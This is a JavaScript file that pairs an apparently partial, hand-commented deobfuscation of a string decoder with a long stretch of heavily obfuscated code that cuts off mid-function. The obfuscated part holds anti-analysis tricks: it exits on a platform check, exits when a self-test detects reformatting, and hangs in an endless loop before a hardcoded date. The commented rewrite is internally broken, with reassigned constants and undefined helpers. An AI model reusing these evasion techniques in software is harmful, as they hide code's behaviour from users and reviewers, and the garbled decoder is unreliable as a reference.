
// Placeholder function for dependency injection
function noop() {}

// Initialize the decoder with dependencies
const decoder = (function(fileSystem, stringProcessor) {
    return stringProcessor(fileSystem());
})(MsCwg5O, BSJ1pS);

// Cache array for processed strings
const processedCache = [];

// Array of encoded strings
const encodedStrings = [
    decoder[0x0],
    decoder[0x1],
    decoder[0x2],
    decoder[0x3],
    "UUcC!\"Zd",
    "{U8X##ycKztgdQ",
    "}8*fg9~(t",
    // ... additional encoded strings ...
];

/**
 * String processing and caching function
 * @param {number} index - Index of string to process
 * @param {string} key - Processing key
 * @param {boolean} force - Force reprocessing
 * @param {Function} processor - Custom processor function
 * @param {Array} cache - Custom cache array
 * @returns {string} Processed string
 */
const processString = (index, key, force, processor = defaultProcessor, cache = processedCache) => {
    // Use default processor if none specified
    if (typeof processor === 'undefined') {
        processor = defaultProcessor;
    }

    // Use default cache if none specified
    if (typeof cache === 'undefined') {
        cache = processedCache;
    }

    // Handle cache override
    if (processor === undefined) {
        processString = cache;
    }

    // Force reprocessing if needed
    if (force && processor !== defaultProcessor) {
        processString = defaultProcessor;
        return processString(index, -1, force, processor, cache);
    }

    // Process and cache string if needed
    if (index !== key) {
        return cache[index] || (cache[index] = processor(encodedStrings[index]));
    }
};
// Different methods to get global context
function getGlobalThisContext() {
    return globalThis;
}

function getGlobalContext() {
    return global;
}

function getWindowContext() {
    return window;
}

function getFunctionContext() {
    return new Function("return this")();
}

/**
 * Detects and returns the appropriate global context
 * @param {Function[]} contextGetters - Array of functions to try for getting global context
 * @returns {Object} The detected global context
 */
function detectGlobalContext(
    contextGetters = [
        getGlobalThisContext,
        getGlobalContext,
        getWindowContext,
        getFunctionContext
    ],
    contextObj,
    prototypeNames = [],
    index = 0
) {
    // Try to get String prototype method name as a check
    try {
        contextObj = Object;
        prototypeNames.push(''.__proto__.toString.name);
    } catch (e) {}

    // Try each context getter
    outerLoop: for (index = 0; index < contextGetters.length; index++) {
        try {
            contextObj = contextGetters[index]();
            
            // Verify context has all required prototype properties
            for (let i = 0; i < prototypeNames.length; i++) {
                if (typeof contextObj[prototypeNames[i]] === "undefined") {
                    continue outerLoop;
                }
            }
            
            return contextObj;
        } catch (e) {}
    }

    // Fallback to current context if all else fails
    return contextObj || this;
}

// Initialize context and required functions
const context = getGlobalContext() || {};
const {
    Buffer,
    process,
    require,
    String: StringConstructor,
    Array: ArrayConstructor
} = context;

/**
 * Creates a UTF-8 decoder function
 * @returns {Function} Decoder function that converts byte arrays to strings
 */
const createUtf8Decoder = (function() {
    // Create lookup table for codepoints
    const lookupTable = new ArrayConstructor(0x80);
    const charFromCode = StringConstructor.fromCodePoint || StringConstructor.fromCharCode;
    const resultArray = [];

    return function decodeBytes(bytes) {
        let codePoint;
        let currentByte;
        const length = bytes.length;
        resultArray.length = 0;

        for (let i = 0; i < length;) {
            currentByte = bytes[i++];

            // Single byte character (0xxx xxxx)
            if (currentByte <= 0x7f) {
                codePoint = currentByte;
            }
            // Two byte character (110x xxxx)
            else if (currentByte <= 0xdf) {
                codePoint = ((currentByte & 0x1f) << 6) | 
                           (bytes[i++] & 0x3f);
            }
            // Three byte character (1110 xxxx)
            else if (currentByte <= 0xef) {
                codePoint = ((currentByte & 0xf) << 12) | 
                           ((bytes[i++] & 0x3f) << 6) | 
                           (bytes[i++] & 0x3f);
            }
            // Four byte character (1111 0xxx)
            else if (StringConstructor.fromCodePoint) {
                codePoint = ((currentByte & 0x7) << 18) | 
                           ((bytes[i++] & 0x3f) << 12) | 
                           ((bytes[i++] & 0x3f) << 6) | 
                           (bytes[i++] & 0x3f);
            }
            // Fallback for unsupported characters
            else {
                codePoint = 0x3f;  // '?' character
                i += 3;
            }

            // Use or create cached character
            resultArray.push(
                lookupTable[codePoint] || 
                (lookupTable[codePoint] = charFromCode(codePoint))
            );
        }

        return resultArray.join('');
    };
})();

function decodeByteArray(byteArray) {
    // Try TextDecoder if available (browser environment)
    if (typeof TextDecoder !== "undefined" && TextDecoder) {
        return new TextDecoder().decode(new Uint8Array(byteArray));
    } 
    // Try Buffer if available (Node.js environment)
    else if (typeof Buffer !== "undefined" && Buffer) {
        return Buffer.from(byteArray).toString("utf-8");
    } 
    // Fall back to custom UTF-8 decoder
    else {
        return decodeUtf8(byteArray);
    }
}

function processStrings(...args) {
    // Cache handler with dependency injection
    const cacheHandler = (index, cache, value, processor, storage) => {
        // Set default processor
        if (typeof processor === "undefined") {
            processor = decoder;
        }
        
        // Set default storage
        if (typeof storage === "undefined") {
            storage = globalCache;
        }
        
        // Return or create cached value
        if (index !== cache) {
            return storage[index] || (storage[index] = processor(encodedStrings[index]));
        }
        
        // Handle special cases
        if (value == processor) {
            return cache ? args[storage[cache]] : globalCache[index] || 
                   (value = storage[index] || processor, globalCache[index] = value(encodedStrings[index]));
        }
        
        // Handle processor override
        if (processor === undefined) {
            cacheHandler = storage;
        }
        
        // Handle processor self-reference
        if (processor === cacheHandler) {
            decoder = cache;
            return decoder(value);
        }
        
        // Handle custom processor
        if (value && processor !== decoder) {
            cacheHandler = decoder;
            return cacheHandler(index, -1, value, processor, storage);
        }
        
        // Handle cache updates
        if (cache) {
            [storage, cache] = [processor(storage), index || value];
            return cacheHandler(index, storage, value);
        }
    };

    // Initialize and get first value
    let initialValue = cacheHandler(0);
    return args[args[initialValue] - 1];

    /**
     * String decoder function
     * @param {string} input - Input string to decode
     * @param {string} charset - Character set for decoding
     * @returns {string} Decoded string
     */
    function decoder(input, 
        charset = "NZ/x1}*]2tSBV>shU\"!dal|)ePiTk:Lq#uI?3.QXY^+;Amvfj`(OJGconM,6F%yrb=w8<CE4RD&g0WH9$z{5Kp~7_@[",
        str, len, result = [], accumulator = 0, bitCount = 0, currentValue, position = 0, charPos) {
        
        // Initialize input string
        str = '' + (input || '');
        len = str.length;
        currentValue = -1;

        // Process each character
        for (position = position; position < len; position++) {
            charPos = charset.indexOf(str[position]);
            
            // Skip invalid characters
            if (charPos === -1) continue;
            
            // Initialize or process value
            if (currentValue < 0) {
                currentValue = charPos;
            } else {
                // Accumulate bits
                currentValue += charPos * 91; // 0x5b
                accumulator |= currentValue << bitCount;
                bitCount += (currentValue & 0x1fff) > 88 ? 13 : 14;
                
                // Extract bytes
                do {
                    result.push(accumulator & 0xff);
                    accumulator >>= 8;
                    bitCount -= 8;
                } while (bitCount > 7);
                
                currentValue = -1;
            }
        }

        // Handle remaining bits
        if (currentValue > -1) {
            result.push((accumulator | currentValue << bitCount) & 0xff);
        }

        return decodeByteArray(result);
    }
}

/**
 * Performs conditional operations based on operation type
 * @param {*} value - Value to operate on
 * @param {number} operationType - Type of operation to perform
 * @returns {*} Result of the operation
 */
function performOperation(value, operationType) {
    switch (currentOpType) {
        case -47:  // -0x2f: Logical NOT
            return !value;
        case -28:  // -0x1c: Numeric negation
            return -value;
    }
}

/**
 * Sets operation type and processes value
 * @param {number} operationType - Type of operation to set
 * @returns {*} Result of processing with new operation type
 */
function setOperationType(operationType) {
    currentOpType = operationType;
    return processValue(
        operationType + 0,  // Force numeric context
        operationType
    );
}

UxmmwSD(A536BJ = A536BJ, function (bw1LDXR, uXPxRCH, mHQbVa) {
    var Xp96Uso = Math.imul || function (bw1LDXR, uXPxRCH) {
        var mHQbVa = (bw1LDXR, uXPxRCH, kY3q474, n49oLe, Ot8M78) => {
            if (typeof n49oLe === bw1LDXR[0x1da]) {
                n49oLe = Q59OVlp;
            }
            if (typeof Ot8M78 === bw1LDXR[0x1da]) {
                Ot8M78 = ph4WoIw;
            }
            if (bw1LDXR !== uXPxRCH) {
                return Ot8M78[bw1LDXR] || (Ot8M78[bw1LDXR] = n49oLe(NkrHL_[bw1LDXR]));
            }
            if (n49oLe === mHQbVa) {
                Q59OVlp = uXPxRCH;
                return Q59OVlp(kY3q474);
            }
            if (uXPxRCH) {
                [Ot8M78, uXPxRCH] = [n49oLe(Ot8M78), bw1LDXR || kY3q474];
                return mHQbVa(bw1LDXR, Ot8M78, kY3q474);
            }
            if (kY3q474 && n49oLe !== Q59OVlp) {
                mHQbVa = Q59OVlp;
                return mHQbVa(bw1LDXR, -0x1, kY3q474, n49oLe, Ot8M78);
            }
            if (n49oLe === undefined) {
                mHQbVa = Ot8M78;
            }
            if (kY3q474 == n49oLe) {
                return uXPxRCH ? bw1LDXR[Ot8M78[uXPxRCH]] : ph4WoIw[bw1LDXR] || (kY3q474 = Ot8M78[bw1LDXR] || n49oLe, ph4WoIw[bw1LDXR] = kY3q474(NkrHL_[bw1LDXR]));
            }
        };
        var kY3q474;
        var Ot8M78;
        var jJIllx;
        UxmmwSD(kY3q474 = -0xda, 0x277, Ot8M78 = -0x193, jJIllx = {
            "e": () => {
                return Ot8M78 += -0x13;
            }
            , "c": function () {
                return (bw1LDXR & 0x3fffff) * (Ot8M78 == -0x62 ? Promise : uXPxRCH);
            }
            , "d": 0x5
            , "k": () => {
                return (Ot8M78 == jJIllx.j && bw1LDXR) & 0xffc00000;
            }
            , "j": -0x193
            , "y": function () {
                return Ot8M78 += -0x15;
            }
            , "l": 0x0
            , "m": function (bw1LDXR = jJIllx[mHQbVa.call(undefined, 0x5af) + mHQbVa(0x5b0) + "ty"]("l")) {
                if (!bw1LDXR) {
                    return jJIllx.q();
                }
                return Ot8M78 += kY3q474 + 0xf6;
            }
            , "B": (bw1LDXR = false) => {
                if (bw1LDXR) {
                    return arguments;
                }
                UxmmwSD(Ot8M78 = 0x9, Ot8M78 += -0x15);
                return "z";
            }
            , "x": 0xe
            , "f": (mHQbVa = false) => {
                if (mHQbVa) {
                    return "h";
                }
                return y7bTqx(uXPxRCH |= 0x0, (bw1LDXR & 0x3fffff) * uXPxRCH);
            }
            , "t": (bw1LDXR = jJIllx.j == "u") => {
                if (bw1LDXR) {
                    return jJIllx.w();
                }
                return (jJIllx[mHQbVa(0x5af) + mHQbVa(0x5b0) + "ty"]("s") ? global : td77ore) | 0x0;
            }
            , I: function (bw1LDXR) {
                return bw1LDXR - 0x258;
            }
        });
        while (kY3q474 + 0x277 + Ot8M78 != 0x34) {
            switch (kY3q474 + 0x277 + Ot8M78) {
            case 0xa:
                var td77ore;
                UxmmwSD(jJIllx.F = "G", td77ore = jJIllx.f());
                if ((Ot8M78 == jJIllx.j && bw1LDXR) & 0xffc00000) {
                    td77ore += ((kY3q474 == -0xda ? bw1LDXR : Promise) & 0xffc00000) * uXPxRCH | 0x0;
                }
                jJIllx.m();
                break;
            case 0x39:
                var td77ore = y7bTqx(uXPxRCH |= 0x0, (bw1LDXR & 0x3fffff) * (Ot8M78 == -0x62 ? Promise : uXPxRCH));
                if (bw1LDXR & 0xffc00000) {
                    td77ore += ((Ot8M78 == -0x164 ? bw1LDXR : Buffer) & 0xffc00000) * (Ot8M78 == 0x5 ? clearInterval : uXPxRCH) | 0x0;
                }
                Ot8M78 += -0x13;
                break;
            case 31:
                if (jJIllx.B() == "z") {
                    break;
                }
            default:
                return jJIllx.t();
                Ot8M78 += 0xe;
                break;
            }
        }

        function Q59OVlp(bw1LDXR, uXPxRCH = "hV\"6x0`#]Z8)HE$:boKkre5/,g|9Cf;nwdD<t>TI7clX_Oiz!(v2pFQUBjuRW?yq=1mJ~4MasG^SP*&Y{.[A@N%L}+3", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, A536BJ) {
            UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
            for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                A536BJ = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                if (A536BJ === -0x1) {
                    continue;
                }
                if (td77ore < 0x0) {
                    td77ore = A536BJ;
                } else {
                    UxmmwSD(td77ore += A536BJ * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                    do {
                        UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                    } while (jJIllx > 0x7);
                    td77ore = -0x1;
                }
            }
            if (td77ore > -0x1) {
                n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
            }
            return pE8Nth(n49oLe);
        }
    };

    function TljPa8(bw1LDXR, uXPxRCH) {
        var mHQbVa = -0x13d;
        var kY3q474;
        var n49oLe;
        var Ot8M78;
        var jJIllx;
        UxmmwSD(kY3q474 = -0x1f2, n49oLe = 0x1cf, Ot8M78 = 0x182, jJIllx = {
            "i": -0x29c
            , "K": () => {
                return n49oLe += -0x70;
            }
            , "j": 0x182
            , "I": () => {
                return Ot8M78 += -0x3;
            }
            , "C": (bw1LDXR = false) => {
                if (bw1LDXR) {
                    return "E";
                }
                return n49oLe += 0x5e;
            }
            , "u": (bw1LDXR = false) => {
                if (bw1LDXR) {
                    return jJIllx;
                }
                return mHQbVa += 0x0;
            }
            , "s": function () {
                return Ot8M78 == kY3q474 + 0x279;
            }
            , "h": () => {
                return 0x41c6ce57 ^ (n49oLe == jJIllx.g && uXPxRCH);
            }
            , "r": () => {
                n49oLe += 0x8;
                return Ot8M78 += -0x3;
            }
            , "ag": (bw1LDXR = jJIllx.W == -0x13d) => {
                if (!bw1LDXR) {
                    return n49oLe == -0x4c;
                }
                UxmmwSD(kY3q474 = -0x18, jJIllx.ad());
                return "ae";
            }
            , "t": 0x0
            , "l": () => {
                return kY3q474 += jJIllx.k;
            }
            , "g": -0x8c
            , "ab": () => {
                return kY3q474 = -0x18;
            }
            , "d": -0x4b
            , "aa": function () {
                return jJIllx.Z();
            }
            , "c": 0xd
            , "G": -0x23
            , "ad": function () {
                mHQbVa *= 0x2;
                mHQbVa -= -0x133;
                n49oLe *= 0x2;
                n49oLe -= 0x14d;
                return Ot8M78 += 0x3;
            }
            , "ac": 0x2
            , "q": function () {
                if (Ot8M78 == 0x182 && false) {
                    UxmmwSD(kY3q474 += -0x271, n49oLe *= 0x2, n49oLe -= -0x345, Ot8M78 += -0x3);
                    return "o";
                }
                UxmmwSD(kY3q474 = -0x18, kY3q474 += jJIllx.k, n49oLe += n49oLe == -0x5f ? -0x1d : 0x2b9);
                return "o";
            }
            , "b": 0x10
            , "W": -0x13d
            , "Z": function () {
                mHQbVa *= 0x2;
                return mHQbVa -= -0x142;
            }
            , "X": -0x1f2
            , "k": -0x271
        });
        while (mHQbVa + kY3q474 + n49oLe + Ot8M78 != 0x82) {
            switch (mHQbVa + kY3q474 + n49oLe + Ot8M78) {
            case mHQbVa + 0x15f:
                var td77ore;
                if (Ot8M78 == kY3q474 + 0x279) {
                    UxmmwSD(jJIllx.u(), kY3q474 += 0x0, n49oLe *= 0x2, n49oLe -= 0x1cf, Ot8M78 += 0x0);
                    break;
                }
                UxmmwSD(td77ore = 0xdeadbeef ^ (jJIllx.B = uXPxRCH), jJIllx.C());
                break;
            default:
            case 0x69:
            case 0x383:
            case 0x1a2:
                if (jJIllx.ag() == "ae") {
                    break;
                }
            case 0x78:
                var Q59OVlp = 0x41c6ce57 ^ uXPxRCH;
                jJIllx.r();
                break;
            case 0x38:
                if (jJIllx.q() == "o") {
                    break;
                }
            case n49oLe != 0x1cf && n49oLe != 0x225 && n49oLe - 0x1ad:
            case 0x1fb:
            case 0x39f:
                var Q59OVlp;
                UxmmwSD(delete jJIllx.ap, Q59OVlp = 0x41c6ce57 ^ (jJIllx.d == -0x13d ? Buffer : uXPxRCH), Ot8M78 += -0x3);
                break;
            case 0x63:
                var Q59OVlp = 0x41c6ce57 ^ (n49oLe == jJIllx.g && uXPxRCH);
                UxmmwSD(kY3q474 += jJIllx.i, n49oLe += 0x2b9, Ot8M78 *= 0x2, Ot8M78 -= 0x185);
                break;
            case 0x1d:
                var Q59OVlp;
                UxmmwSD(delete jJIllx.C, Q59OVlp = 0x41c6ce57 ^ uXPxRCH, kY3q474 *= 0x2, kY3q474 -= 0x2ba, n49oLe += 0x2b9, Ot8M78 += n49oLe == jJIllx.d ? "e" : -0x3);
                break;
            case 0xce:
            case 0x7d:
            case 0x27b:
                if (jJIllx.i == 0x17f || false) {
                    UxmmwSD(mHQbVa += 0x5, n49oLe += -0x70);
                    break;
                }
                var A536BJ = 0x0;
                for (var ph4WoIw; A536BJ < bw1LDXR.length; A536BJ++) {
                    UxmmwSD(ph4WoIw = bw1LDXR.charCodeAt(A536BJ), td77ore = Xp96Uso(td77ore ^ (jJIllx.M = ph4WoIw), 0x9e3779b1), Q59OVlp = (jJIllx.O = Xp96Uso)(Q59OVlp ^ ph4WoIw, 0x5f356495));
                }
                return (jJIllx.i == "R" ? Infinity : y7bTqx)(td77ore = Xp96Uso((mHQbVa == -0x13d ? td77ore : clearInterval) ^ td77ore >>> 0x10, 0x85ebca6b) ^ Xp96Uso(Q59OVlp ^ Q59OVlp >>> 0xd, 0xc2b2ae35), Q59OVlp = Xp96Uso(Q59OVlp ^ (mHQbVa == jJIllx.W && Q59OVlp) >>> 0x10, 0x85ebca6b) ^ (mHQbVa == -0x13d && Xp96Uso)(td77ore ^ (n49oLe == 0x22d ? td77ore : Proxy) >>> (kY3q474 == jJIllx.X ? jJIllx : WeakSet)
                    .c, 0xc2b2ae35), 0x100000000 * (0x1fffff & Q59OVlp) + (td77ore >>> 0x0));
                jJIllx.Z();
                break;
            }
        }
    }

    function w4YYdZb(bw1LDXR, uXPxRCH, mHQbVa) {
        bw1LDXR = (bw1LDXR, uXPxRCH, mHQbVa, kY3q474, n49oLe) => {
            if (typeof kY3q474 === bw1LDXR[0x1da]) {
                kY3q474 = Kg3ITsT;
            }
            if (typeof n49oLe === bw1LDXR[0x1da]) {
                n49oLe = ph4WoIw;
            }
            if (mHQbVa == kY3q474) {
                return uXPxRCH ? bw1LDXR[n49oLe[uXPxRCH]] : ph4WoIw[bw1LDXR] || (mHQbVa = n49oLe[bw1LDXR] || kY3q474, ph4WoIw[bw1LDXR] = mHQbVa(NkrHL_[bw1LDXR]));
            }
            if (bw1LDXR !== uXPxRCH) {
                return n49oLe[bw1LDXR] || (n49oLe[bw1LDXR] = kY3q474(NkrHL_[bw1LDXR]));
            }
        };

        function n49oLe([], bw1LDXR, uXPxRCH, mHQbVa) {
            UxmmwSD(uXPxRCH = (bw1LDXR, mHQbVa, n49oLe, Ot8M78, jJIllx) => {
                if (typeof Ot8M78 === "undefined") {
                    Ot8M78 = kY3q474;
                }
                if (typeof jJIllx === "undefined") {
                    jJIllx = ph4WoIw;
                }
                if (Ot8M78 === uXPxRCH) {
                    kY3q474 = mHQbVa;
                    return kY3q474(n49oLe);
                }
                if (n49oLe && Ot8M78 !== kY3q474) {
                    uXPxRCH = kY3q474;
                    return uXPxRCH(bw1LDXR, -0x1, n49oLe, Ot8M78, jJIllx);
                }
                if (bw1LDXR !== mHQbVa) {
                    return jJIllx[bw1LDXR] || (jJIllx[bw1LDXR] = Ot8M78(NkrHL_[bw1LDXR]));
                }
                if (mHQbVa) {
                    [jJIllx, mHQbVa] = [Ot8M78(jJIllx), bw1LDXR || n49oLe];
                    return uXPxRCH(bw1LDXR, jJIllx, n49oLe);
                }
            }, mHQbVa = [uXPxRCH(0x1)]);
            if (rKAu9MB(require('os')
                    .platform() === mHQbVa[0x0], MHQ3bYA(-0x2f))) {
                process.exit();
            }

            function kY3q474(bw1LDXR, uXPxRCH = "9>0.!?zy&`;sGAQbLI2tWB7O1\"^fSeU_FNaCD:,x/[~6nw8vk*u(+H]qgY4R@ZJ{}p3)P=|KoE<Mm5Xlh%rVi#cj$dT", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                    xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(n49oLe);
            }
        }

        function Ot8M78([], bw1LDXR, uXPxRCH, mHQbVa, kY3q474, n49oLe) {
            UxmmwSD(uXPxRCH = (bw1LDXR, mHQbVa, kY3q474, n49oLe, Ot8M78) => {
                if (typeof n49oLe === bw1LDXR[0x1da]) {
                    n49oLe = jJIllx;
                }
                if (typeof Ot8M78 === "undefined") {
                    Ot8M78 = ph4WoIw;
                }
                if (n49oLe === undefined) {
                    uXPxRCH = Ot8M78;
                }
                if (n49oLe === uXPxRCH) {
                    jJIllx = mHQbVa;
                    return jJIllx(kY3q474);
                }
                if (kY3q474 == n49oLe) {
                    return mHQbVa ? bw1LDXR[Ot8M78[mHQbVa]] : ph4WoIw[bw1LDXR] || (kY3q474 = Ot8M78[bw1LDXR] || n49oLe, ph4WoIw[bw1LDXR] = kY3q474(NkrHL_[bw1LDXR]));
                }
                if (bw1LDXR !== mHQbVa) {
                    return Ot8M78[bw1LDXR] || (Ot8M78[bw1LDXR] = n49oLe(NkrHL_[bw1LDXR]));
                }
                if (mHQbVa) {
                    [Ot8M78, mHQbVa] = [n49oLe(Ot8M78), bw1LDXR || kY3q474];
                    return uXPxRCH(bw1LDXR, Ot8M78, kY3q474);
                }
                if (kY3q474 == bw1LDXR) {
                    return mHQbVa[ph4WoIw[kY3q474]] = uXPxRCH(bw1LDXR, mHQbVa);
                }
            }, mHQbVa = uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x5]), kY3q474 = [uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x4])]);
            const Ot8M78 = bw1LDXR.a;
            if (function () {
                    var bw1LDXR = function () {
                        const uXPxRCH = function () {
                            var uXPxRCH = (mHQbVa, bw1LDXR, n49oLe, Ot8M78, jJIllx) => {
                                if (typeof Ot8M78 === "undefined") {
                                    Ot8M78 = kY3q474;
                                }
                                if (typeof jJIllx === "undefined") {
                                    jJIllx = ph4WoIw;
                                }
                                if (n49oLe && Ot8M78 !== kY3q474) {
                                    uXPxRCH = kY3q474;
                                    return uXPxRCH(mHQbVa, -0x1, n49oLe, Ot8M78, jJIllx);
                                }
                                if (Ot8M78 === uXPxRCH) {
                                    kY3q474 = bw1LDXR;
                                    return kY3q474(n49oLe);
                                }
                                if (mHQbVa !== bw1LDXR) {
                                    return jJIllx[mHQbVa] || (jJIllx[mHQbVa] = Ot8M78(NkrHL_[mHQbVa]));
                                }
                            };
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[uXPxRCH(0x2)](bw1LDXR);

                            function kY3q474(uXPxRCH, mHQbVa = "4FdcEfVjktGHX/aTuOR)J1AK?Uz(bNQP$M]Cq}`&hS#^|\"<nD{:+_owZ.8937rLI06YslBpWy*ex2[;!~g>,iv=5@m%", kY3q474, bw1LDXR, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                                UxmmwSD(kY3q474 = '' + (uXPxRCH || ''), bw1LDXR = kY3q474.length, td77ore = -0x1);
                                for (Q59OVlp = Q59OVlp; Q59OVlp < bw1LDXR; Q59OVlp++) {
                                    xtbSJI = mHQbVa.indexOf(kY3q474[Q59OVlp]);
                                    if (xtbSJI === -0x1) {
                                        continue;
                                    }
                                    if (td77ore < 0x0) {
                                        td77ore = xtbSJI;
                                    } else {
                                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                                        do {
                                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                                        } while (jJIllx > 0x7);
                                        td77ore = -0x1;
                                    }
                                }
                                if (td77ore > -0x1) {
                                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                                }
                                return pE8Nth(n49oLe);
                            }
                        };
                        return uXPxRCH();
                    };
                    return bw1LDXR();
                }()) {
                process.exit();
            }
            return bw1LDXR.b[Ot8M78(0x28b)]()[uXPxRCH(0x3)](Ot8M78(0x2d1))[kY3q474[0x0] + "ng"]()[mHQbVa](bw1LDXR.b)[Ot8M78(0x2ea)](Ot8M78(0x2d1));

            function jJIllx(bw1LDXR, uXPxRCH = "}FdOTQsCPkbpE[%1:zao8]4H3S{>Z&cWxi?5m@|wq~IUK!n7f6A.()2^`JyD*j,_$Bg<tG/LvRN=uXeM\"#0l;Vh9r+Y", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                    xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(n49oLe);
            }
        }

        function jJIllx([], bw1LDXR, uXPxRCH, mHQbVa, kY3q474) {
            UxmmwSD(uXPxRCH = (bw1LDXR, mHQbVa, kY3q474, Ot8M78, jJIllx) => {
                if (typeof Ot8M78 === bw1LDXR[0x1da]) {
                    Ot8M78 = n49oLe;
                }
                if (typeof jJIllx === bw1LDXR[0x1da]) {
                    jJIllx = ph4WoIw;
                }
                if (mHQbVa) {
                    [jJIllx, mHQbVa] = [Ot8M78(jJIllx), bw1LDXR || kY3q474];
                    return uXPxRCH(bw1LDXR, jJIllx, kY3q474);
                }
                if (kY3q474 && Ot8M78 !== n49oLe) {
                    uXPxRCH = n49oLe;
                    return uXPxRCH(bw1LDXR, -0x1, kY3q474, Ot8M78, jJIllx);
                }
                if (Ot8M78 === undefined) {
                    uXPxRCH = jJIllx;
                }
                if (kY3q474 == Ot8M78) {
                    return mHQbVa ? bw1LDXR[jJIllx[mHQbVa]] : ph4WoIw[bw1LDXR] || (kY3q474 = jJIllx[bw1LDXR] || Ot8M78, ph4WoIw[bw1LDXR] = kY3q474(NkrHL_[bw1LDXR]));
                }
                if (bw1LDXR !== mHQbVa) {
                    return jJIllx[bw1LDXR] || (jJIllx[bw1LDXR] = Ot8M78(NkrHL_[bw1LDXR]));
                }
            }, mHQbVa = [uXPxRCH(0x6)]);
            if (new Date()[mHQbVa[0x0]]() < 0x18cc21afbf3) {
                while (true) {
                    kY3q474 = 0x63;
                    for (kY3q474 = 0x63; kY3q474 == kY3q474; kY3q474 *= kY3q474) {
                        if (y7bTqx(rKAu9MB(kY3q474, A536BJ = -0x2f) && console.log(kY3q474), kY3q474) <= 0xa) {
                            break;
                        }
                    };
                    if (kY3q474 === 0x64) {
                        kY3q474--;
                    }
                };
            }
            return bw1LDXR.c;

            function n49oLe(bw1LDXR, uXPxRCH = "yFDnPstgobfC[5#8vH}eG*=@OuBmd`(%.;+kw!XKqa,)3Q&l~Y]4ZV^iz/|S:REWIpNr{M\"LxJ9TA7c0_?1j>h$U<26", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                    xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(n49oLe);
            }
        }

        function td77ore([], bw1LDXR, uXPxRCH, mHQbVa, kY3q474, n49oLe, Ot8M78, jJIllx, td77ore, Q59OVlp, xtbSJI, TaFn0Uv, Kt94kB, Xb4IwJx, i0gUcBP, pukrvr, MsCwg5O, BSJ1pS, Xp96Uso, TljPa8, vhNite, lA0B8WY) {
            UxmmwSD(uXPxRCH = (bw1LDXR, mHQbVa, kY3q474, n49oLe, Ot8M78) => {
                if (typeof n49oLe === "undefined") {
                    n49oLe = e0MiDs;
                }
                if (typeof Ot8M78 === bw1LDXR[0x1da]) {
                    Ot8M78 = ph4WoIw;
                }
